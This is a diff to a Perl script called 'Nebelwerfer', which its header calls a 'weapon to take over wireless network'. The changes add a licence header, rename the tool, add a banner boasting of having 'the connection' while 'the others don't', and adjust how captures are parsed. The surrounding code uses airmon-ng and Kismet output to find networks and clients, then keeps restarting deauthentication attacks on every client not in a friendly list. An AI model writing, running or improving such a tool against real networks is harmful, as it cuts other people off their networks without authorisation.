@@ -1,4 +1,23 @@
 #!/usr/bin/perl
+#  Nebelwerfer. A huge perl-written weapon to take over wireless network
+# Copyright (C) 2012 hagall (asbrandr@jabber.ru)
+
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+
+# Rev1, 20121028
+# alpha build!
 
 #-------------------------------------------------------------------------------
 # 			Settings section
@@ -9,7 +28,7 @@
 	our @friendly_macs 	= qw//;
 	
 	our $workdir 		= "/tmp/";
-	our $fileprefix 	= "hagall";
+	our $fileprefix 	= "nebelwerfer";
 	
 	
 	our $airmon 		= "/usr/local/sbin/airmon-ng";
@@ -29,7 +48,12 @@
 	`rm $workdir/deauth* -f`;
 
 	$SIG{INT}= $SIG{TERM} = \&term_handler;
-
+	
+	print YELLOW, BOLD;
+	print "NEBELWERFER\n";
+	print "-----------------------------------------\n";
+	print "That awkward moment when you have the connection and the others don't\n\n";
+	print RESET;
 
 	
 					# Turn our wireless card into monitor mode
@@ -161,7 +185,6 @@
 					# expired and restart deauth for them
 		foreach (keys %client_macs)
 		{
-			print "$client_macs{$_} - ".(kill 0, $client_macs{$_})."\n";
 			unless (kill 0, $client_macs{$_})	
 			{
 				my $deauth_pid = deauth_session($_, $bssid);
@@ -279,7 +302,7 @@ sub get_bssids
 			
 		eval {	
 		my $xml = new XML::DOM::Parser;
-		my $doc = $xml->parsefile("/tmp/hagall-01.kismet.netxml");
+		my $doc = $xml->parsefile($filename);
 		my $root = $doc->getDocumentElement();
 		my $networks = $root->getElementsByTagName("wireless-network");
 		for(my $i = 0; $i < $networks->getLength(); $i++)
@@ -297,7 +320,6 @@ sub get_bssids
 				push @$result, { "bssid" => $cur_bssid, "channel" => $cur_channel, "clients" => $clients_count };
 			}		
 		}
-		
 		$okread = 1;
 		1;
 		}
